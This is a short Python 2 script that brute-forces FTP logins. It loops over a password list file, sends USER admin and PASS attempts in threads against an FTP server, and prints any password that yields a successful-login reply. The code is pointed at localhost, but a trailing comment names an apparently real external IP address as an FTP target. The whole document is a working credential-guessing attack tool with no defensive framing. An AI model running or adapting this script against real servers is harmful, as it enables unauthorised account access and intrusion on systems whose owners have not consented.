#coding=utf-8
import socket
import threading



CLTR='\r\n'
user_='USER'
pass_='PASS'


def getconnect(host,port=21):
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(2)
    try:
        client.connect((host,port))
        getretv(client)
    except Exception,e:
        exit(1)
    return  client


def getretv(sk):
    while 1:
        data=sk.recv(8192)
        if int(data[:3])==230:
                return 1
        if data[-2:]==CLTR:
            print data
            break
            return None

def getlogin(username,password,client):

    client.send(user_+' '+username+CLTR)
    getretv(client)
    client.send(pass_+' '+password+CLTR)
    if  getretv(client):
        print 'password is %s' %password

    client.close()

if __name__=='__main__':
    file_handel=open('pass.txt','rb')
    for i in file_handel.readlines():


        q=getconnect('127.0.0.1',21)
        thread = threading.Thread(target=getlogin,args=('admin',i.strip('\n'),q))
        thread.start()
        #getlogin('admin',i.strip('\n'),q)

#121.42.7.225 saibo xingan ftp





